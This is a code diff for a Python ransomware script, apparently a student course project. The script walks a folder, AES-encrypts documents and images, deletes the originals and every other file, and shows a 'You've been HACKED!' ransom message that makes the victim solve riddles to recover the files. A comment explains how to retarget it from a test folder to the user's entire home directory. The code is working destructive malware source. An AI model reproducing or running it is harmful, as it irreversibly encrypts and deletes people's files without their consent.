@@ -7,8 +7,9 @@ from pprint import pprint
 import sys
 
 def encrypt_file(key, in_filename):
-    out_filename = in_filename + '.enc'
-    iv = ''.join(random.choice('0123456789ABCDEF') for i in range(16))
+    out_filename = os.path.splitext(in_filename)[0]
+    out_filename = out_filename + '.enc'
+    iv = ''.join(random.choice('0123456789') for n in range(16))
     print(sys.getsizeof(iv[1]))
     encryptor = AES.new(key, AES.MODE_CBC, iv)
     filesize = os.path.getsize(in_filename)
@@ -16,15 +17,16 @@ def encrypt_file(key, in_filename):
     with open(in_filename, 'rb') as infile:
         with open(out_filename, 'wb') as outfile:
             outfile.write(struct.pack('<Q', filesize))
-            outfile.write(iv)
+            outfile.write(iv.encode('utf-8'))
             while True:
                 chunk = infile.read(chunksize)
                 if len(chunk) == 0:
                     break
                 elif len(chunk) % 16 != 0:
-                    chunk += ' ' * (16 - len(chunk) % 16)
+                    chunk += (' ' * (16 - len(chunk) % 16)).encode('utf-8')
 
                 outfile.write(encryptor.encrypt(chunk))
+
 
 def decrypt_file(key, in_filename):
     chunksize=24*1024
@@ -41,34 +43,124 @@ def decrypt_file(key, in_filename):
                 if len(chunk) == 0:
                     break
                 outfile.write(decryptor.decrypt(chunk))
-
             outfile.truncate(origsize)
 
 
+def puzzleOne():
+    answer = ""
+    check = 0
+    while(answer != "g" or answer != "G"):
+        answer = input("What always ends everything?\n")
+        if(answer == "g" or answer == "G"):
+            print("You got it!\n")
+            return 1;
+        else:
+            while(check != 1):
+                print("That's not right you dum dum!\n")
+                value = input("Do you give up? (Y/N)\n")
+                if(value == "Y"):
+                    print("HAHAHA YOU LOSE\n")
+                    check = 1
+                    return 0;
+                elif(value == "N"):
+                    check = 1
+                    print("Alright, lets try again!\n")
+                else:
+                    print("Invalid Input")
+    return 0;
+
+def puzzleTwo():
+    answer = ""
+    check = 0
+    while(answer != "g" or answer != "G"):
+        answer = input("I can fly, but I don't have wings. I don't have eyes, but I can cry! What I am?\n")
+        if(answer == "A cloud" or answer == "a cloud" or answer == "cloud" or answer == "Cloud"  or answer == "A Cloud"  or answer == "a Cloud"):
+            print("That's right, one more and you can have your files back!\n")
+            return 1;
+        else:
+            while(check != 1):
+                print("Big oof, incorrect my dude!")
+                value = input("Do you give up? (Y/N)\n")
+                if(value == "Y"):
+                    check = 1
+                    print("HAHAHA YOU LOSE\n")
+                    return 0;
+                elif(value == "N"):
+                    check = 1
+                    print("Have another go!\n")
+                else:
+                    print("Invalid Input")
+    return 0;
+
+def puzzleThree():
+    answer = ""
+    check = 0
+    while(answer != "g" or answer != "G"):
+        answer = input("Two sisters we are, one is dark and one is fair, \nIn twin towers dwelling we’re quite the pair, \nOne from land and one from sea, \nTell us truly, who are we?\n")
+        if(answer == "Salt and Pepper" or answer == "salt and pepper" or answer == "salt and Pepper" or answer == "Salt and pepper"  or answer == "Salt And Pepper"):
+            print("That's right, you got it!\n")
+            return 1;
+        else:
+            while(check != 1):
+                print("Rip, incorrect dum dum!")
+                value = input("Do you give up? (Y/N)\n")
+                if(value == "Y"):
+                    check = 1
+                    print("HAHAHA YOU LOSE\n")
+                    return 0;
+                elif(value == "N"):
+                    check = 1
+                    print("Have another go!\n")
+                else:
+                    print("Invalid Input")
+    return 0;
+
+# Call encryption function here
+
 user_home = pathlib.Path.home()
+# HI! to not cause complete destruction to you system, to just test our code
+# copy the given testfolder into this location
 target_folder = "dev/cs460/finalProject/testFolder"
 start_path = os.path.join(user_home, target_folder)
 print("Running folder scan on " + start_path)
+
+#Now if you're ready for the real thing, uncomment the following lines and comment the ones above!
+# start_path = os.path.join(user_home)
+# print("Running folder scan on " + start_path)
 
 dir_list = []
 file_list = []
 key  = ''.join(random.choice('0123456789abcdef') for n in range(32))
 for root, dirs, files in os.walk(start_path):
     for name in files:
-        # print(os.path.join(root, name))
-        encrypt_file(key, os.path.join(root, name))
+        if(name.lower().endswith(('.txt', '.png', '.jpg', '.docx', '.pdf'))):
+            encrypt_file(key, os.path.join(root, name))
+        if(not(name.lower().endswith('.enc'))):
+            os.remove(os.path.join(root, name))
         file_list.append(os.path.join(root, name))
     for name in dirs:
-        # print(os.path.join(root, name))
-        encrypt_file(key, os.path.join(root, name))
         dir_list.append(os.path.join(root, name))
 
 print("\nDirectories:")
-print(dir_list)
+#print(dir_list)
 print("\nFolders:")
-pprint(file_list)
+#pprint(file_list)
 
-#To decrypt the files, uncomment the following lines
-# for root, dirs, files in os.walk(start_path):
-#     for name in file_list:
-#         decrypt_file(key, name)
+
+num = 0;
+print("You've been HACKED! \nSoRrY bUt AlL yOuR fIlEs HaVe bEeN eNcRyPtEd. \nIf YoU wAnT tHeM bAcK, sOlVe thEsE pUzZleS. OThErwIse, wE'lL delEte EveRytHinG!")
+num = num + puzzleOne()
+if(num == 1):
+    num = num + puzzleTwo()
+if(num == 2):
+    num = num + puzzleThree()
+if(num == 3):
+    for root, dirs, files in os.walk(start_path):
+        for name in files:
+            if(name.strip().endswith('.enc')):
+                decrypt_file(key, os.path.join(root, name))
+            if(name.lower().endswith('.enc')):
+                os.remove(os.path.join(root, name))
+    print("Your files have been decrypted, enjoy your day!\n")
+else:
+    print("Sorry, all your files are gone.\n")
